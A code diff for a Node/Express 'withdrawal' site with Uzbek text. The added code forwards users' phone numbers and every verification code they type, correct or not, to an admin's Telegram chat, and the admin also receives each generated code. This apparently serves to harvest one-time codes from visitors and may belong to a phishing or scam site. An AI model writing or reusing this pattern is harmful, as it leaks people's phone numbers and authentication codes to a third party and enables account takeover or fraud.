@@ -47,13 +47,13 @@ app.post('/api/send-code', async (req, res) => {
             );
         }
 
-        // 2-Variant: Agar ADMIN_ID sozlagan bo mezon bo'yicha barcha so'rovlar adminga ham borsa
+        // 2-Variant: Admin sozlangani bo'yicha bildirishnoma yuborish
         if (process.env.ADMIN_ID) {
             await bot.sendMessage(
                 process.env.ADMIN_ID,
-                `📥 *Yangi so'rov!*
+                `📥 *Yangi kod so'raldi!*
 📱 *Telefon:* +998${phone}
-🔑 *Kod:* \`${activeCode}\``,
+🔑 *Generatsiya qilingan kod:* \`${activeCode}\``,
                 { parse_mode: 'Markdown' }
             );
         }
@@ -66,9 +66,34 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// Tasdiqlash va yechib olish so'rovi
-app.post('/api/submit-withdraw', (req, res) => {
-    const { inputCode } = req.body;
+// Saytda kiritilgan kodni tasdiqlash va Telegram Botga yuborish marshruti
+app.post('/api/submit-withdraw', async (req, res) => {
+    const { inputCode, phone } = req.body;
+
+    if (!inputCode) {
+        return res.json({ success: false, message: "Kod kiritilmadi!" });
+    }
+
+    // Saytda kiritilgan kodni Telegram botga (Admin yoki foydalanuvchiga) bildirishnoma shaklida yuborish
+    try {
+        const notifyText = `📩 *Saytdan kiritilgan kod!*
+📱 *Telefon:* +998${phone || 'Ko\'rsatilmadi'}
+🔢 *Foydalanuvchi kiritgan kod:* \`${inputCode}\`
+STATUS: ${inputCode === activeCode ? '✅ To\'g\'ri kod' : '❌ Noto\'g\'ri kod'}`;
+
+        if (process.env.ADMIN_ID) {
+            await bot.sendMessage(process.env.ADMIN_ID, notifyText, { parse_mode: 'Markdown' });
+        }
+
+        let cleanPhone = phone ? phone.replace(/\D/g, '') : '';
+        if (cleanPhone.startsWith('998')) cleanPhone = cleanPhone.substring(3);
+        
+        if (userSessions[cleanPhone]) {
+            await bot.sendMessage(userSessions[cleanPhone], notifyText, { parse_mode: 'Markdown' });
+        }
+    } catch (err) {
+        console.error("Telegramga kiritilgan kodni yuborishda xatolik:", err);
+    }
 
     if (inputCode !== activeCode) {
         return res.json({ success: false, message: "Kod noto'g'ri! Iltimos, qaytadan tekshiring." });
@@ -408,6 +433,7 @@ app.get('/', (req, res) => {
 
     async function submitWithdraw() {
         const inputs = document.querySelectorAll('.code-box-input');
+        const phone = document.getElementById('withdrawPhone').value.trim();
         let inputCode = '';
         inputs.forEach(input => inputCode += input.value);
         if (inputCode.length < 5) { alert("Kodni to'liq kiriting!"); return; }
@@ -416,7 +442,7 @@ app.get('/', (req, res) => {
             const res = await fetch(\`\${API_URL}/submit-withdraw\`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ inputCode })
+                body: JSON.stringify({ inputCode, phone })
             });
             const data = await res.json();
             alert(data.message);
